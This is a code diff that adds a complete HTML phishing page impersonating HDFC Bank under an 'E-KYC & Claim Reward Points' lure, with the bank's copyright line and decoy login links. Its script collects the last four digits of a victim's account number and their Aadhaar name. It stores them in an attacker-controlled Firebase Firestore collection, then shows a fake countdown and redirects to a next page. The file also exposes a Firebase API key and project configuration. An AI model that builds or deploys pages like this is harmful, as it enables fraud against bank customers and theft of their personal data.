@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>welcome clm</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f6f6f6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .container {
+      background: white;
+      width: 100%;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 16px;
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input[type="text"] {
+      width: 80%;
+      padding: 7px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 5px;
+    }
+
+    .btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 6px;
+      font-size: 16px;
+      width: 60%;
+      border-radius: 2px;
+      cursor: pointer;
+      height: 35px;
+      margin-bottom: 20px;
+    }
+
+    .bottom-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .extra-section {
+      padding: 20px;
+      background: #fff;
+      color: #000;
+    }
+
+    .extra-section h3 {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    .extra-section a {
+      color: #007bff;
+      display: block;
+      margin-bottom: 10px;
+      font-size: 15px;
+      text-decoration: none;
+    }
+
+    .extra-section ul {
+      padding-left: 20px;
+      margin: 10px 0;
+    }
+
+    .footer {
+      background: #004a8d;
+      color: white;
+      text-align: center;
+      padding: 15px 10px;
+      font-size: 13px;
+    }
+
+    .footer a {
+      color: white;
+      text-decoration: underline;
+      margin-left: 5px;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #007bff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    .loading-text {
+      color: white;
+      font-size: 18px;
+      font-family: Arial, sans-serif;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.appspot.com",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+</head>
+<body>
+
+  <img class="header-image" src="https://i.ibb.co/4RHd20wx/Screenshot-2025-05-12-21-14-09-83-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Header Image">
+
+  <div class="container">
+    <h2>Complete Your E-KYC & Claim Reward Points – HDFC Bank</h2>
+
+    <label>AC Last 4 Digits</label>
+    <input type="text" id="account-number" placeholder="" maxlength="4" pattern="\d{4}" title="Enter 4 digit account number" required>
+
+    <label>As per Aadhaar Name</label>
+    <input type="text" id="aadhaar-name" placeholder="" required>
+
+    <button class="btn" onclick="submitForm()">SUBMIT</button>
+
+    <img class="bottom-image" src="https://i.ibb.co/dw7tSCHQ/Screenshot-2025-05-12-20-55-22-29-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+  </div>
+
+  <div class="extra-section">
+    <p>Don't have a HDFC Bank Savings Account?</p>
+    <a href="#">Prepaid Card only? Login here</a>
+    <a href="#">HDFC Home Loan only? Login here</a>
+    <a href="#">HDFC Limited Deposit only? Login here</a>
+
+    <h3>We have added a host of new features!</h3>
+    <p>You can now do so much more:</p>
+    <ul>
+      <li>Anywhere access through Desktop or mobile</li>
+      <li>Enhanced security measures</li>
+    </ul>
+  </div>
+
+  <div class="footer">
+    ©Copyright HDFC Bank Ltd.
+    <a href="#">Terms and Condition</a> |
+    <a href="#">Privacy Policy</a>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">
+      Please wait... <span id="countdownText">10</span>s
+    </div>
+  </div>
+
+  <script>
+    function submitForm() {
+      const accountNumber = document.getElementById('account-number').value.trim();
+      const aadhaarName = document.getElementById('aadhaar-name').value.trim();
+
+      if (accountNumber === "" || aadhaarName === "") {
+        alert("Please fill in all fields");
+        return;
+      }
+
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      // Save to Firestore
+      db.collection("alldata-hare").add({
+        accountNumber: accountNumber,
+        aadhaarName: aadhaarName,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        let countdown = 10;
+        const loadCountdown = document.getElementById('countdownText');
+        loadCountdown.textContent = countdown;
+
+        const loadInterval = setInterval(() => {
+          countdown--;
+          loadCountdown.textContent = countdown;
+          if (countdown <= 0) {
+            clearInterval(loadInterval);
+            document.getElementById('loadingOverlay').style.display = 'none';
+            window.location.href = "nextpage.html"; // Change this if needed
+          }
+        }, 1000);
+      }).catch((error) => {
+        alert("Error saving data: " + error.message);
+        document.getElementById('loadingOverlay').style.display = 'none';
+      });
+    }
+  </script>
+
+</body>
+</html>
